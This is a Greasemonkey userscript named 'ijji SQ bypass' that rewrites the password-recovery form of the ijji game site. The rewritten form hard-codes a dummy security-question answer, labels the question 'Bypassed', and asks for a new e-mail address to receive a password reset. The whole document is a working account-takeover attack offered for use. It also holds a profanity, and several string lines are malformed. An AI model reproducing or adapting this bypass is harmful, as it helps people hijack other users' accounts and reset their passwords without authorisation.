*// ==UserScript==
// @name           ijji SQ bypass
// @namespace      http://www.meeek.com
// @description    Bypasses ijji security question when trying to edit account information or viewing G Coin page.
// @author         meeekus
// @version        1.0
// @include        http://member.ijji.com/account/findAccount.nhn?m=findPwdByQuest

// ==/UserScript==

document.getElementById('form').innerHTML = '<input type="hidden" name="http://member.ijji.com/account/findAccount.nhn?m=findPwdByQuest" />' +
'	<input type="hidden" name="failedcount" value="0" />' +
'	<input type="hidden" name="a" value="q1" />' +
'	<input type="hidden" name="otherquestion" value="0" />' +
'	<input type="hidden" name="hintquest2" />' +
'	<input type="hidden" name="hintanswer2" />' +
'	<div id="history"><a href="http://www.ijji.com">Home</a> &gt; <a href=""http://login.ijji.com/login.nhn">Sign In</a> &gt; Security Question Verification</div>' +
'		<div style="width: 592px; height: 78px; position: relative; top: 0px; left: 0px; margin-bottom: 15px;">' +
'			<div style="position: absolute; top:  0px; left:  0px;"><img src="http://images.ijjimax.com/v3/member/wide/myaccount_verifyaccount.gif" /></div>' +
'			<div style="position: absolute; top: 39px; left: 20px; text-align: left; font-size: 15px; line-height: 14px; color: #FFF;">' +
'				Source: Some random off GZF<br />Author: meeekus' +
'			</div>' +
'		</div>' +
'	<div class="subox01_m">' +
		<ul class="exp02">' +
'			<li>FUCK YOU!</li>' +
'			<li>An e-mail allowing you to reset the password will be sent to the new e-mail address provided.</li>' +
'		</ul>' +
'	</div>' +
'	<div class="subox02_m">' +
'			<table class="su" cellspacing="0" cellpadding=0" align="center">' +
'			<tbody>
'				<tr valign="top">' +
'					<td class="field01">User ID</td>' +
'					<td class="form"><input type="text" style="width: 240px;" class="box01" value="" name="memberid"/>' +
'				</tr>' +
'				<tr valign="top">' +
'					<td class="field01">Security Question<input type="hidden" name="hintquest" value="PQS006" /></td>' +
'					<td class="form">' +
'						<select name="selecthintquest" style="background:#eee none; color:#222;">' +
'							<option value="q1" selected readonly="readonly">Bypassed</option>' +
'						</select><br><span id="error_hintquest" name="error_hintquest" style="color=#ff0000"></span>' +
'					</td>' +
'				</tr>
'				<tr valign="top">' +
'					<td class="field01">Your Answer</td>' +
'					<td class="form"><input type="hidden" name="hintanswer" value="a" class="box02" maxlength="20"' +
'						onblur="trimInputField(this)"><input type="text" readonly="readonly" class="box01" maxlength="20" value="Bypassed" style="background:#eee none; color:#222;"><span id="error_hintanswer" name="error_hintanswer" style="color: #ff0000"></span></td>' +
'				</tr>' +
'				<!-- 200903 -->' +
'				<tr valign="top">' +
'					<td class="field01">New E-mail<input type="hidden" name="hintquest" value="PQS006" /></td>' +
'					<td class="form02">' +
'						<input type="text" style="width: 240px;" class="box01" value="" name="email"/>' +
'					</td>' +
'				</tr><tr valign="top">' +
'					<td class="field01">Re-enter E-mail</td>' +
'					<td class="form02"><input type="text" style="width: 240px;" class="box01" value="" name="email2"/></td>' +
'				</tr>' +
'				<tr>' +
'				<td colspan="2" style="padding:3px 0 0 8px;color:#464646;font-size:10px;text-align:center;" class="ln14">' +
'					The user who doesn\'t set up their \'Security Question\' should do so in the profile edit page.<br />' +
'It moves on the edit page even if you don\'t select \'Security Question\' prior to setting up. ' +
'				</td>' +
'				</tr>				' +
'				<!-- //200903 -->' +
'			</tbody>
'			</table>' +
'		</div>' +
'	</div>' +
'	<div class="n_cbox01_b"></div>' +
'	<div class="cbtn" style="text-align: center;">' +
'		<a href="javascript:form.submit();"><img src="http://images.ijjimax.com/v2/common/btn_submit.gif" width="90" height="31" alt="submit" /></a>' +
'	</div>';